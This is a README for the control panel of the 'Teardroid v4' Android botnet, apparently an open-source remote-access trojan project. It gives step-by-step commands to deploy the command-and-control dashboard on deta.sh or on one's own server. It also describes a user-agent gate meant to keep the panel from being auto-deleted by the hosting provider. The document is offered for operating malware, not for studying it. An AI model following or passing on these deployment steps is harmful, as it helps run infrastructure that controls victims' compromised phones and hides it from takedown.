# Teardroidv4_api

Teardroid v4 Botnet API

This api is for teardroid v4 botnet

Please visit https://github.com/ScRiPt1337/Teardroid-phprat to know about teardroid and how to use it

### Deploy the Teardroid control panel on deta.sh

- Set up an account at [deta.sh](https://web.deta.sh/)
- [Click here](https://github.com/ScRiPt1337/Teardroidv4_api/fork) to fork this repo into your github account and click create fork
- Teardroidv4_api repo will be forked into your account
- Open the forked repo and click on config.py file and Change the value of "hello" to any user_agent or text you want
- https://go.deta.dev/deploy?repo=your-repo-url reaplce your-repo-url with the url of your forked repo and open it on browser
- and click deploy
- change your user-agent of the browser with the value of USER_AGENT you have enter in config.py
- you can use this chrome extension to change user useragent [extension](https://chrome.google.com/webstore/detail/custom-useragent-string/lejiafennghcpgmbpiodgofeklkpahoe)
- DONE

#### Deploy video on deta.sh

!["scatter"](https://external-content.duckduckgo.com/iu/?u=https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/Animation.gif)

### Run control panel on your own server

- Clone [Teardroidv4_api](https://github.com/ScRiPt1337/Teardroidv4_api) repo using the command below

```bash
$ git clone https://github.com/ScRiPt1337/Teardroidv4_api
```

- Install uvicorn

```bash
$ sudo apt-get install uvicorn
$ python3 -m pip install uvicorn
```

- Change dir to Teardroidv4_api

```bash
$ cd Teardroidv4_api
```

- Install all dependency

```bash
$ pip install -r requirements.txt
```

- change project key to connect with database
- Set up an account at [deta.sh](https://web.deta.sh/) and go to project keys and create a new key and copy it

```bash
$ nano ./db/database.py
from deta import Deta
from os import getenv

deta = Deta(getenv("DETA_PROJECT_KEY")) => deta =  Deta("demo project key")
# replace getenv("DETA_PROJECT_KEY") with your deta.sh project key
# make sure your remove getenv
```

- open config.py and change the value of "hello" to any user_agent or text you want
- Run teardroid api

```bash
$ screen
# press enter to go inside the screen session
$ uvicorn main:app --host 0.0.0.0 --port 80
# now close your terminal windows  and we are good to go
```

- Change your user-agent of the browser with the value of USER_AGENT you have enter in config.py
- you can use this chrome extension to change user useragent [extension](https://chrome.google.com/webstore/detail/custom-useragent-string/lejiafennghcpgmbpiodgofeklkpahoe)
- Done

### IMPORTANT NOTICE

- you will not be able to access the dashboard if you dont change your user-agent with the same value of USER_AGENT inside config.py file.
- its to make you the dashboard more secure and to protect it from geting auto deleted from deta.sh
